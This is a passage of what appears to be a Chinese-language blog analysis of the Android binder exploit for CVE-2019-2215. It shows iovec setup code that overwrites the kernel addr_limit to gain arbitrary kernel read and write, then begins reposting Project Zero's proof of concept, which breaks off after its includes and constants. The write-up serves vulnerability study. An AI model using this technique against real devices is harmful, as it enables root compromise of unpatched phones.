<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">iovec[<span style="color:#ae81ff">10</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
iovec[<span style="color:#ae81ff">11</span>].iov_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>;
iovec[<span style="color:#ae81ff">11</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x28</span>;
iovec[<span style="color:#ae81ff">12</span>].iov_base <span style="color:#f92672">=</span> current_ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>;
iovec[<span style="color:#ae81ff">12</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
</code></pre></td></tr></table>
</div>
</div><p>以上刚好是0x28 Bytes的数据，而<code>current_ptr</code>正是我们已经通过第一次leak <code>tast_struct</code> 得到的地址，所以此时的<code>iovec[12].iov_base</code>就指向了<code>addr_limit</code>所在的内存。同时<code>iovec[11].iob_base</code>指向的内存(从<code>iovec[10].iov_len</code>开始的0x28 Bytes)已经写完。所以此时<code>write</code>会将接下来的数据写入<code>iovec[12].iov_base</code>指向的内存(也即存储<code>addr_limit</code>的内存)，即</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">// current_ptr + 0x8 points to task_stuct.thread_info.addr_limit
</span><span style="color:#75715e"></span><span style="color:#f92672">*</span>(current_ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffffffffffe</span>;
</code></pre></td></tr></table>
</div>
</div><p>到这里，就成功篡改了<code>addr_limit</code>的限制，后面即可读写kernel任意内存。</p>
<h3 id="25-full-poc">2.5 Full Poc</h3>
<p>这里把 P0提供的完整<a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885">poc</a>贴在这里，方便查阅。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">173
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">174
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">175
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">176
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">177
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">178
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">179
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">180
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">181
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">182
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">183
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">184
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">185
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">186
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">187
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">188
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">189
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">190
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">191
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">192
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">193
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">194
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">195
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">196
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">197
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">198
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">199
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">200
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">201
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">202
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">203
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">204
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">205
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">206
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">207
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">208
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">209
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">210
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">211
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">212
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">213
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">214
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">215
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">216
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">217
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">218
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">219
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">220
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">221
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">222
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">223
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">224
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">225
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">226
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">227
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">228
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">229
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">230
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">231
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">232
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">233
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">234
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">235
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">236
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">237
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">238
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">239
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">240
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">241
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">242
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">243
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">244
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">245
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">246
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">247
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">/*
</span><span style="color:#75715e"> * POC to gain arbitrary kernel R/W access using CVE-2019-2215
</span><span style="color:#75715e"> * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
</span><span style="color:#75715e"> *
</span><span style="color:#75715e"> * Jann Horn &amp; Maddie Stone of Google Project Zero
</span><span style="color:#75715e"> *
</span><span style="color:#75715e"> * 3 October 2019
</span><span style="color:#75715e">*/</span>

<span style="color:#75715e">#define _GNU_SOURCE
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/wait.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/uio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;err.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sched.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/epoll.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/sched.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/prctl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/un.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define BINDER_THREAD_EXIT 0x40046208ul
</span><span style="color:#75715e"></span><span style="color:#75715e">// NOTE: we don&#39;t cover the task_struct* here; we want to leave it uninitialized
</span><span style="color:#75715e"></span><span style="color:#75715e">#define BINDER_THREAD_SZ 0x190
</span><span style="color:#75715e">#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) </span><span style="color:#75715e">//25
</span><span style="color:#75715e"></span><span style="color:#75715e">#define WAITQUEUE_OFFSET 0xA0
